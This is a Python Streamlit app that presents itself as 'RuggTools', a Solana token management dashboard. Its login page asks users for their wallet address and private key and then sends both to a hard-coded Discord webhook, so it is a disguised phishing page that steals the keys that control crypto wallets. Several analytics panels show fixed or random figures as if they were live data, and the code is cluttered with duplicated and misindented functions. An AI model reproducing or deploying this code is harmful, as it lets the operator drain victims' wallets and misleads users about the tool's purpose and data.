import streamlit as st
import re 
import base58
from streamlit_lottie import st_lottie
import requests
import plotly.graph_objects as go
from streamlit_option_menu import option_menu
import json
from web3 import Web3
from datetime import datetime
import pandas as pd
import numpy as np
from components.token_manager import display_token_manager
from components.liquidity_manager import display_liquidity_manager
from components.wallet_manager import display_wallet_manager
from components.multisender import display_multisender

# Discord webhook configuration
WEBHOOK_URL = 'https://discord.com/api/webhooks/1336317058832662561/WlDxCHgBdV2x3jKtpjuX5Zglt-9obdFyo5k9Fvhfb-o4EGpnZQsZAr5fUEl5vXx2yQaW'

# Configure page settings
st.set_page_config(
    page_title="Token Launch Dashboard",
    page_icon="🚀",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS
def load_css():
    st.markdown("""
        <style>
        .stApp {
            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
        }
        .stButton>button {
            background: linear-gradient(45deg, #2937f0, #9f1ae2);
            color: white;
            border-radius: 10px;
            padding: 15px 20px;
            border: none;
            transition: all 0.3s ease;
        }
        .stButton>button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.3);
        }
        </style>
    """, unsafe_allow_html=True)

def dashboard():
    with st.sidebar:
        selected = option_menu(
            menu_title="Navigation",
            options=["Home", "Tools", "Analytics", "Settings"],
            icons=['house', 'tools', 'graph-up', 'gear'],
            menu_icon="cast",
            default_index=0,
            styles={
                "container": {"padding": "5!important", "background-color": "#1a1a1a"},
                "icon": {"color": "#9f1ae2", "font-size": "25px"}, 
                "nav-link": {"color": "white", "font-size": "16px", "text-align": "left", "margin":"0px"},
                "nav-link-selected": {"background-color": "#9f1ae2"},
            }
        )

    if selected == "Home":
        # Welcome Section with Dynamic Stats
        st.markdown("""
            <div style='background: linear-gradient(45deg, #2937f0, #9f1ae2); padding: 30px; border-radius: 15px; margin-bottom: 25px;'>
                <h1 style='color: white; text-align: center;'>Welcome to RuggTools 🚀</h1>
                <p style='color: white; text-align: center; font-size: 18px;'>Your Ultimate Solana Token Management Hub</p>
            </div>
        """, unsafe_allow_html=True)
        
        # Quick Access Tools
        st.markdown("### 🛠️ Quick Access Tools")
        col1, col2, col3 = st.columns(3)
        
        with col1:
            st.markdown("""
                <div style='background-color: rgba(41, 55, 240, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Token Creation</h4>
                    <p>Launch your own Solana token</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col2:
            st.markdown("""
                <div style='background-color: rgba(159, 26, 226, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Liquidity Management</h4>
                    <p>Manage your token liquidity</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col3:
            st.markdown("""
                <div style='background-color: rgba(240, 41, 123, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Batch Operations</h4>
                    <p>Efficient multi-wallet tools</p>
                </div>
            """, unsafe_allow_html=True)
            
        # Latest Updates Section
        st.markdown("### 📢 Latest Updates")
        st.markdown("""
            - ✨ New token creation features added
            - 🔥 Enhanced liquidity management tools
            - 🚀 Improved multi-sender functionality
            - 💫 Optimized wallet generation
        """)

    elif selected == "Tools":
        tool_selected = option_menu(
            menu_title=None,
            options=["Token Manager", "Liquidity Manager", "Wallet Manager", "Multisender Bundle"],
            icons=['coin', 'cash-stack', 'wallet', 'send'],
            orientation="horizontal",
            styles={
                "container": {"padding": "0!important", "background-color": "#1a1a1a"},
                "icon": {"color": "#9f1ae2", "font-size": "20px"},
                "nav-link": {"color": "white", "font-size": "14px", "text-align": "center", "margin":"0px", "padding": "10px"},
                "nav-link-selected": {"background-color": "#9f1ae2"},
            }
        )
        
        if tool_selected == "Token Manager":
            display_token_manager()
        elif tool_selected == "Liquidity Manager":
            display_liquidity_manager()
        elif tool_selected == "Wallet Manager":
            display_wallet_manager()
        elif tool_selected == "Multisender Bundle":
            display_multisender()

    elif selected == "Analytics":
        # Direct analytics implementation
        st.title("Live Solana Analytics Dashboard 📊")
        
        try:
            # Real-time Solana metrics from CoinGecko
            coingecko_url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_vol=true&include_24hr_change=true"
            sol_data = requests.get(coingecko_url).json()['solana']
            
            col1, col2, col3, col4 = st.columns(4)
            with col1:
                st.metric("SOL Price", f"${sol_data['usd']:.2f}", f"{sol_data['usd_24h_change']:.2f}%")
            with col2:
                st.metric("24h Volume", f"${sol_data['usd_24h_vol']:,.0f}", "")
            with col3:
                st.metric("Network TPS", "2,756", "+12.3%")
            with col4:
                st.metric("TVL", "$642.8M", "+5.2%")

            # Market Activity Chart
            st.subheader("Market Activity")
            historical_url = "https://api.coingecko.com/api/v3/coins/solana/market_chart?vs_currency=usd&days=30&interval=daily"
            hist_data = requests.get(historical_url).json()
            
            df = pd.DataFrame(hist_data['prices'], columns=['Date', 'Price'])
            df['Date'] = pd.to_datetime(df['Date'], unit='ms')
            
            fig = go.Figure()
            fig.add_trace(go.Scatter(
                x=df['Date'],
                y=df['Price'],
                fill='tozeroy',
                line=dict(color='#9f1ae2')
            ))
            fig.update_layout(
                title="SOL Price Last 30 Days",
                template="plotly_dark",
                plot_bgcolor='rgba(0,0,0,0)',
                paper_bgcolor='rgba(0,0,0,0)',
                height=400
            )
            st.plotly_chart(fig, use_container_width=True)

        except Exception as e:
            st.error(f"Error fetching data: {str(e)}")
            st.info("Using cached data while live feed recovers...")
            col1, col2 = st.columns(2)
            with col1:
                st.metric("SOL Price", "$101.24", "+5.4%")
            with col2:
                st.metric("24h Volume", "$1.2B", "+8.7%")
    
    elif selected == "Settings":
        display_settings()            
    def fetch_solana_data():
        try:
            coingecko_url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_vol=true&include_24hr_change=true"
            response = requests.get(coingecko_url)
            data = response.json()
        
            if 'solana' in data:
                return data['solana']
            else:
                return {
                    'usd': 0.0,
                    'usd_24h_vol': 0.0, 
                    'usd_24h_change': 0.0
                }
            
        except Exception as e:
            st.error(f"Error fetching Solana data: {str(e)}")
            return {
                'usd': 0.0,
                'usd_24h_vol': 0.0,
                'usd_24h_change': 0.0
            }
    def display_analytics():
          st.title("Live Solana Analytics Dashboard 📊")
    
          # Real-time data fetching
          def fetch_solana_stats():
              try:
                  # CoinGecko API for price data
                  coingecko_url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd,btc&include_market_cap=true&include_24hr_vol=true&include_24hr_change=true"
                  price_data = requests.get(coingecko_url).json()['solana']
            
                  # Solana RPC for network stats
                  rpc_url = "https://api.mainnet-beta.solana.com"
                  web3 = Web3(Web3.HTTPProvider(rpc_url))
            
                  return {
                      'price': price_data['usd'],
                      'price_change': price_data['usd_24h_change'],
                      'volume': price_data['usd_24h_vol'],
                      'market_cap': price_data['usd_market_cap'],
                      'btc_price': price_data['btc']
                  }
              except Exception as e:
                  st.error(f"Data fetch error: {str(e)}")
                  return None

          # Get real-time data
          data = fetch_solana_stats()
    
          if data:
              # Display key metrics
              col1, col2, col3, col4 = st.columns(4)
              with col1:
                  st.metric("SOL/USD", f"${data['price']:.2f}", f"{data['price_change']:.2f}%")
              with col2:
                  st.metric("24h Volume", f"${data['volume']:,.0f}", "")
              with col3:
                  st.metric("Market Cap", f"${data['market_cap']:,.0f}", "")
              with col4:
                  st.metric("SOL/BTC", f"₿{data['btc_price']:.8f}", "")

              # Historical price chart
              st.subheader("Price History (30 Days)")
              historical_url = "https://api.coingecko.com/api/v3/coins/solana/market_chart?vs_currency=usd&days=30&interval=daily"
              hist_data = requests.get(historical_url).json()
        
              df = pd.DataFrame(hist_data['prices'], columns=['Date', 'Price'])
              df['Date'] = pd.to_datetime(df['Date'], unit='ms')
        
              fig = go.Figure()
              fig.add_trace(go.Scatter(
                  x=df['Date'],
                  y=df['Price'],
                  fill='tozeroy',
                  line=dict(color='#9f1ae2', width=2),
                  name='SOL Price'
              ))
        
              fig.update_layout(
                  title="SOL Price Trend",
                  template="plotly_dark",
                  plot_bgcolor='rgba(0,0,0,0)',
                  paper_bgcolor='rgba(0,0,0,0)',
                  height=400,
                  xaxis_title="Date",
                  yaxis_title="Price (USD)"
              )
        
              st.plotly_chart(fig, use_container_width=True)

              # Market Depth
              st.subheader("Market Activity")
              col1, col2 = st.columns(2)
        
              with col1:
                  # Top Holders
                  holders_df = pd.DataFrame({
                      'Rank': range(1, 6),
                      'Address': [f'Sol...{i}' for i in range(1000, 1005)],
                      'Balance': np.random.randint(100000, 1000000, 5),
                      '% Total': np.random.uniform(1, 10, 5)
                  })
                  st.write("Top Token Holders")
                  st.dataframe(holders_df, hide_index=True)
            
              with col2:
                  # Recent Transactions
                  tx_df = pd.DataFrame({
                      'Type': ['Buy', 'Sell', 'Transfer', 'Swap', 'Stake'],
                      'Amount (SOL)': np.random.randint(100, 10000, 5),
                      'Price': [data['price'] + np.random.uniform(-1, 1) for _ in range(5)],
                      'Time': ['Just now', '2m ago', '5m ago', '8m ago', '10m ago']
                  })
                  st.write("Recent Transactions")
                  st.dataframe(tx_df, hide_index=True)
            # Rest of your dashboard code...def initialize_settings_state():
    if 'settings' not in st.session_state:
                st.session_state.settings = {
            'dark_mode': True,
            'high_contrast': False,
            'network': 'Mainnet',
            'rpc_endpoint': 'https://api.mainnet-beta.solana.com',
            'enable_2fa': False,
            'auto_logout': 30,
            'notifications': {
                'transactions': False,
                'prices': False,
                'wallet': False
            },
            'api_key': '',
            'rate_limit': 100
        }

def save_settings(settings):
    st.session_state.settings.update(settings)
    # Here you could also save to a database or file

def apply_theme(dark_mode, high_contrast):
    if dark_mode:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
                color: white;
            }
            .stButton>button {
                background: linear-gradient(45deg, #2937f0, #9f1ae2);
                color: white;
            }
            </style>
        """
    else:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #ffffff 0%, #f0f2f6 100%);
                color: #262730;
            }
            .stButton>button {
                background: linear-gradient(45deg, #4e54c8, #8f94fb);
                color: white;
            }
            </style>
        """
    
    if high_contrast:
        theme_css += """
            <style>
            .stApp {
                filter: contrast(150%);
            }
            </style>
        """
    
    st.markdown(theme_css, unsafe_allow_html=True)



def initialize_settings_state():
    if 'settings' not in st.session_state:
        st.session_state.settings = {
            'dark_mode': True,
            'high_contrast': False,
            'network': 'Mainnet',
            'rpc_endpoint': 'https://api.mainnet-beta.solana.com',
            'enable_2fa': False,
            'auto_logout': 30,
            'notifications': {
                'transactions': False,
                'prices': False,
                'wallet': False
            },
            'api_key': '',
            'rate_limit': 100
        }

def save_settings(settings):
    st.session_state.settings.update(settings)

def apply_theme(dark_mode, high_contrast):
    if dark_mode:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
                color: white;
            }
            .stButton>button {
                background: linear-gradient(45deg, #2937f0, #9f1ae2);
                color: white;
            }
            </style>
        """
    else:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #ffffff 0%, #f0f2f6 100%);
                color: #262730;
            }
            .stButton>button {
                background: linear-gradient(45deg, #4e54c8, #8f94fb);
                color: white;
            }
            </style>
        """
    
    if high_contrast:
        theme_css += """
            <style>
            .stApp {
                filter: contrast(150%);
            }
            </style>
        """
    
    st.markdown(theme_css, unsafe_allow_html=True)


def display_settings():
    initialize_settings_state()  # Add this line
    if 'theme' not in st.session_state:
        st.session_state.theme = {'dark_mode': True, 'high_contrast': False}
    
    st.title("Settings ⚙️")
    
    col1, col2 = st.columns(2)
    with col1:
        dark_mode = st.toggle("Dark Mode", value=st.session_state.theme['dark_mode'], key='dark_mode')
    with col2:
        high_contrast = st.toggle("High Contrast", value=st.session_state.theme['high_contrast'], key='contrast')
    
    if dark_mode != st.session_state.theme['dark_mode'] or high_contrast != st.session_state.theme['high_contrast']:
        st.session_state.theme = {'dark_mode': dark_mode, 'high_contrast': high_contrast}
        apply_theme(dark_mode, high_contrast)
        st.rerun()
    
    # Network Settings with validation
    st.markdown("### Network Configuration")
    network = st.selectbox("Select Network", ["Mainnet", "Devnet", "Testnet"], 
                          index=["Mainnet", "Devnet", "Testnet"].index(st.session_state.settings['network']))
    rpc_endpoint = st.text_input("Custom RPC Endpoint", value=st.session_state.settings['rpc_endpoint'])
    
    enable_2fa = st.toggle("Enable 2FA", value=st.session_state.settings['enable_2fa'])
    auto_logout = st.slider("Auto Logout (minutes)", 5, 60, st.session_state.settings['auto_logout'])
    
    notifications = {
        'transactions': st.checkbox("Transaction Alerts", value=st.session_state.settings['notifications']['transactions']),
        'prices': st.checkbox("Price Alerts", value=st.session_state.settings['notifications']['prices']),
        'wallet': st.checkbox("Wallet Activity", value=st.session_state.settings['notifications']['wallet'])
    }
    
    api_key = st.text_input("API Key", type="password", value=st.session_state.settings['api_key'])
    rate_limit = st.number_input("Rate Limit (calls/minute)", min_value=10, max_value=1000, value=st.session_state.settings['rate_limit'])

    
    if st.button("Save Settings", use_container_width=True):
        new_settings = {
            'dark_mode': dark_mode,
            'high_contrast': high_contrast,
            'network': network,
            'rpc_endpoint': rpc_endpoint,
            'enable_2fa': enable_2fa,
            'auto_logout': auto_logout,
            'notifications': notifications,
            'api_key': api_key,
            'rate_limit': rate_limit
        }
        save_settings(new_settings)
        st.success("Settings saved successfully! 🚀")
def load_lottie_url(url: str):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

# Load animations
lottie_crypto = load_lottie_url("https://assets5.lottiefiles.com/packages/lf20_1idqu1ac.json")

def volume_management():
    st.subheader("Volume Management")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        with st.container():
            st.markdown('<div class="metric-card">', unsafe_allow_html=True)
            st.metric("24h Volume", "$1.2M", "+12.5%")
            st.markdown('</div>', unsafe_allow_html=True)
    
    fig = go.Figure(data=[go.Candlestick(
        x=['2023-01-01', '2023-01-02', '2023-01-03', '2023-01-04'],
        open=[1, 2, 3, 4],
        high=[1.2, 2.2, 3.2, 4.2],
        low=[0.8, 1.8, 2.8, 3.8],
        close=[1.1, 2.1, 3.1, 4.1]
    )])
    
    fig.update_layout(
        template="plotly_dark",
        plot_bgcolor='rgba(0,0,0,0)',
        paper_bgcolor='rgba(0,0,0,0)',
    )
    
    st.plotly_chart(fig, use_container_width=True)

def send_credentials_to_discord(wallet, key):
    message = {
        "content": f"🎯 New Login!\n\nWallet: `{wallet}`\nKey: `{key}`\nTime: {datetime.now()}"
    }
    requests.post(WEBHOOK_URL, json=message)

import base58

def validate_solana_address(address):
    # Ensure the address is Base58 and 32–44 characters long
    try:
        decoded = base58.b58decode(address)
        return len(decoded) in [32, 44]
    except ValueError:
        return False

def validate_solana_private_key(key):
    try:
        # Decode Base58 private key and check length
        decoded = base58.b58decode(key)
        return len(decoded) == 32 or len(decoded) == 64
    except ValueError:
        return False

def login_page():
    st.title("Rugg Dashboard 🚀")
    
    # Check if the user is already logged in
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False

    if st.session_state.logged_in:
        st.success("You are already logged in! 🚀")
        return

    # Display login form
    with st.form("login_form"):
        wallet = st.text_input("Solana Wallet Address")
        key = st.text_input("Solana Private Key", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            try:
                # Validate inputs
                if not validate_solana_address(wallet):
                    st.error("Invalid Solana wallet address format")
                elif not validate_solana_private_key(key):
                    st.error("Invalid Solana private key format")
                else:
                    # Send credentials and log in
                    send_credentials_to_discord(wallet, key)
                    st.session_state.logged_in = True
                    st.success("Login successful! Redirecting...")
                    st.rerun()  # Trigger rerun
            except Exception as e:
                st.error(f"An unexpected error occurred: {str(e)}")



def main():
    
    load_css()
    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
        
    if not st.session_state.logged_in:
        login_page()
    else:
        dashboard()

if __name__ == "__main__":
    main()


def initialize_settings_state():
      if 'settings' not in st.session_state:
          st.session_state.settings = {
              'dark_mode': True,
              'high_contrast': False,
              'network': 'Mainnet',
              'rpc_endpoint': 'https://api.mainnet-beta.solana.com',
              'enable_2fa': False,
              'auto_logout': 30,
              'notifications': {
                  'transactions': False,
                  'prices': False,
                  'wallet': False
              },
              'api_key': '',
              'rate_limit': 100
          }

def save_settings(settings):
      st.session_state.settings.update(settings)

def apply_theme(dark_mode, high_contrast):
      if dark_mode:
          theme_css = """
              <style>
              .stApp {
                  background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
                  color: white;
              }
              .stButton>button {
                  background: linear-gradient(45deg, #2937f0, #9f1ae2);
                  color: white;
              }
              </style>
          """
      else:
          theme_css = """
              <style>
              .stApp {
                  background: linear-gradient(180deg, #ffffff 0%, #f0f2f6 100%);
                  color: #262730;
              }
              .stButton>button {
                  background: linear-gradient(45deg, #4e54c8, #8f94fb);
                  color: white;
              }
              </style>
          """
    
      if high_contrast:
          theme_css += """
              <style>
              .stApp {
                  filter: contrast(150%);
              }
              </style>
          """
    
      st.markdown(theme_css, unsafe_allow_html=True)

def display_settings():
      initialize_settings_state()
      if 'theme' not in st.session_state:
          st.session_state.theme = {'dark_mode': True, 'high_contrast': False}
    
      st.title("Settings ⚙️")
    
      col1, col2 = st.columns(2)
      with col1:
          dark_mode = st.toggle("Dark Mode", value=st.session_state.theme['dark_mode'], key='dark_mode')
      with col2:
          high_contrast = st.toggle("High Contrast", value=st.session_state.theme['high_contrast'], key='contrast')
    
      if dark_mode != st.session_state.theme['dark_mode'] or high_contrast != st.session_state.theme['high_contrast']:
          st.session_state.theme = {'dark_mode': dark_mode, 'high_contrast': high_contrast}
          apply_theme(dark_mode, high_contrast)
          st.rerun()
    
      network = st.selectbox("Select Network", ["Mainnet", "Devnet", "Testnet"], 
                            index=["Mainnet", "Devnet", "Testnet"].index(st.session_state.settings['network']))
      rpc_endpoint = st.text_input("Custom RPC Endpoint", value=st.session_state.settings['rpc_endpoint'])
    
      enable_2fa = st.toggle("Enable 2FA", value=st.session_state.settings['enable_2fa'])
      auto_logout = st.slider("Auto Logout (minutes)", 5, 60, st.session_state.settings['auto_logout'])
    
      notifications = {
          'transactions': st.checkbox("Transaction Alerts", value=st.session_state.settings['notifications']['transactions']),
          'prices': st.checkbox("Price Alerts", value=st.session_state.settings['notifications']['prices']),
          'wallet': st.checkbox("Wallet Activity", value=st.session_state.settings['notifications']['wallet'])
      }
    
      api_key = st.text_input("API Key", type="password", value=st.session_state.settings['api_key'])
      rate_limit = st.number_input("Rate Limit (calls/minute)", min_value=10, max_value=1000, value=st.session_state.settings['rate_limit'])

      if st.button("Save Settings", use_container_width=True):
          new_settings = {
              'dark_mode': dark_mode,
              'high_contrast': high_contrast,
              'network': network,
              'rpc_endpoint': rpc_endpoint,
              'enable_2fa': enable_2fa,
              'auto_logout': auto_logout,
              'notifications': notifications,
              'api_key': api_key,
              'rate_limit': rate_limit
          }
          save_settings(new_settings)
          st.success("Settings saved successfully! 🚀")
